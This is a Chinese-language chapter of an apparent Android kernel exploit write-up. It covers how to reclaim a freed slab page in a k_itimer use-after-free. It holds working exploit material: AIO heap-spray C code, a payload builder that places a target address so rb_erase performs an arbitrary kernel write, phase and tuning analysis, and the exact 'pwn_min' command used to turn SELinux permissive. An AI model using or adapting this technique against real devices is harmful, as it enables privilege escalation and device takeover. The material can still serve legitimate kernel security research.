# 07 · 载体对比：怎么「抢回」那一页

**中文** · [English](en/07-carriers.md)

> UAF 的核心是：目标页被释放后，用我们可控的内容重新占住它。
> 这一章讲我们试过的载体，以及为什么最后用的是 AIO。

---

## 一、要解决的问题

```
① 内核释放了装着 k_itimer 的那个 8KB slab
② 我们要在它被别的东西占用之前，用**我们控制的 4KB 页**把它占回来
③ 占回来的页里要有我们的 payload：
        node+0x00 = 0
        node+0x08 = 0
        node+0x10 = target
```

**难点在第 ②：slab 是 order-1（2 个连续物理页）。我们的用户映射每次只能拿 1 页，
所以必须「恰好拿到那两页中的某一页」，而且要知道是哪一页。**

---

## 二、候选载体

| 载体 | 每单位页数 | 是否用户可写 | 能否大量获取 | 能否知道拿到了哪页 |
|---|---|---|---|---|
| **pipe buffer** | 16 × 4KB | ✅ | ⚠️ 受限 | ❌ |
| **AF_UNIX socket 缓冲** | 可变 | ✅ | ✅ | ❌ |
| **AIO 环（`io_setup`）** | 每上下文多页 | ✅ | ✅✅ | ❌ |
| **VMA（`mmap`）** | 1 页 | ✅ | ⚠️ 有上限 | ❌ |
| **perf ring** | 1 页 | ✅ | ✅ | ❌ |

---

## 三、pipe 的问题：被 `pipe-user-pages-soft` 卡死

最初的实现用 pipe：

```c
for (i = 0; i < npipes; i++) {
    pipe(pfd);
    fcntl(pfd[1], F_SETPIPE_SZ, 4096 * 16);
    write(pfd[1], buf, 4096 * 16);
}
```

**实测只能拿到约 40 MB**，远不够。

原因：`/proc/sys/fs/pipe-user-pages-soft` 限制了非特权用户能占用的 pipe 页总数（约 64 MB）。

**⇒ pipe 载体容量太小，不够覆盖 8 KB slab 的回收窗口。**

---

## 四、AIO：真正的突破口

### 4.1 `io_setup` 给你的是**用户可写的、order-0 的、UNMOVABLE 的**页

```c
aio_context_t ctx = 0;
syscall(__NR_io_setup, 1, &ctx);     // 每个上下文映射一段环
```

**实测数据**：

```
$ /data/local/tmp/aio_probe
创建 AIO 上下文: 60000 个，失败 0 个
占用内存: 234 MB
```

**60,000 个上下文、234 MB、零失败。**

对比 pipe 的 40 MB —— **这是 6 倍的容量，而且没有失败。**

### 4.2 为什么 AIO 页特别好用

| 特性 | 说明 |
|---|---|
| **order-0** | 每次分配单页，正好对应 slab 拆分后的半页 |
| **UNMOVABLE** | 不会被内存回收挪走 |
| **持久** | 不主动 `io_destroy` 就一直占着 |
| **用户可写** | 直接 `memset` 就能铺 payload |
| **容量大** | 60,000 页 = 234 MB |

### 4.3 实现要点

```c
#define MAX_AIO 200000

static aio_context_t *g_ctx;

static int aio_spray(size_t pages)
{
    size_t n = 0;

    g_ctx = calloc(MAX_AIO, sizeof(*g_ctx));
    for (size_t i = 0; i < pages && i < MAX_AIO; i++) {
        g_ctx[i] = 0;
        if (syscall(__NR_io_setup, 1, &g_ctx[i]) == 0)
            n++;
        else
            g_ctx[i] = 0;
    }
    return (int)n;
}
```

**注意**：`io_setup` 会 mmap 一段环到用户空间，那段内存就是我们要铺 payload 的地方。

---

## 五、页内相位问题（我们用血的代价发现的）

### 5.1 8 KB slab 会被拆成两半

order-1 slab 是 2 个连续物理页 `page[N]` 和 `page[N+1]`。
slab 释放后，buddy 把它们拆开，回到 order-0 空闲链表。

**我们的 AIO 每次只能拿到其中一页。** 拿到哪一页是随机的。

### 5.2 三种相位

如果 payload 是 24 字节周期（`value`、`0`、`target`）铺满整页，
那么 node 落在页内不同位置时，`rb_erase` 看到的三个字段不同：

| 相位 | node[0] | node[8] | node[0x10] | 走哪条分支 | 会写成吗 |
|---|---|---|---|---|---|
| **0** | 0 | 0 | target | `!tmp`（左子非空）| ✅ `*(target) = 0` |
| **8** | 0 | target | 0 | `!tmp && !child` | ✅ `*(node[8]) = node[0]` → `*(target) = 0` |
| **16** | target | 0 | 0 | 两个子都空 | ❌ 只 `*root = 0`，无害 |

**⇒ 相位 0 和 8 都能写成，只有 16 是浪费。**

### 5.3 但相位 8 有副作用

相位 8 走的那条分支会额外执行：

```asm
0x78e0  str  x8, [x11]       ; *root = target   ← 把堆地址写进 timerqueue 头
0x78e8  str  x9, [x8]        ; *(target) = 0     ✅ 写成了
```

**写是写成了，但 timerqueue 的头被污染了，后续任何 posix timer 操作都可能崩。**

### 5.4 我们的解法：统一相位

```c
/* 让整页都是同一个相位，而不是交替 */
#define PAYLOAD_PERIOD 24

static void build_page(unsigned char *page, int phase,
                       uint64_t target)
{
    for (int off = phase; off + 24 <= 4096; off += PAYLOAD_PERIOD) {
        *(uint64_t *)(page + off + 0)  = 0;        /* value */
        *(uint64_t *)(page + off + 8)  = 0;        /* 0 */
        *(uint64_t *)(page + off + 16) = target;   /* target */
    }
}
```

然后**相位参数用 8**（实测比 0 更稳）。

### 5.5 更彻底的办法：先算准偏移

见 [08-exact-hit.md](08-exact-hit.md) —— 如果我们知道 `victim` 的确切地址，
就能算出 `node` 在页内的精确偏移，**根本不需要猜相位**。

---

## 六、其它载体的实测结论

| 载体 | 结论 |
|---|---|
| pipe | ❌ 容量被 `pipe-user-pages-soft` 卡在 ~40 MB |
| socket 8KB | ⚠️ 可以，但 `kmalloc-8k` 是 order-3（`objperslab=4, pagesperslab=8`），和 order-1 slab 不匹配 |
| VMA | ⚠️ 有 `vm.max_map_count` 上限 |
| perf ring | ⚠️ 每事件 1 页，但数量受 `perf_event_paranoid` 和 fd 上限限制 |
| **AIO** | ✅ **60,000 页 / 234 MB / 零失败** |

**Shark 的源码里三种载体都有（filler=VMA / AIO / perf），
并且有 `PREFIX_DEFAULT 256` / `CHURN_DEFAULT 993` / `PCP_PRIME_DEFAULT 8192` 三个调节手法。**

这三者的作用：

| 参数 | 作用 |
|---|---|
| **PREFIX** | 先做 N 次前置分配，让目标页排到理想的深度 |
| **CHURN** | 分配/释放 N 次，打乱 freelist 顺序 |
| **PCP priming** | 灌满 per-cpu page list，让后续分配走确定路径 |

**这些参数要按本机 slab 布局扫，不能照抄。**

---

## 七、我们的最终配方

```bash
# Stage A（打 Permissive）
/data/local/tmp/pwn_min 8 30000 1 aio same
#                        │ │     │ │    └─ 统一相位（不是交替）
#                        │ │     │ └─ AIO 载体
#                        │ │     └─ 每 pipe 1 页（AIO 模式下忽略）
#                        │ └─ 30000 个单位
#                        └─ 相位 8
```

**成功率**：约 2/3（相位 16 那次会失败）。

**这正是 Shark 后来用 EXACT HIT 彻底解决的问题。**
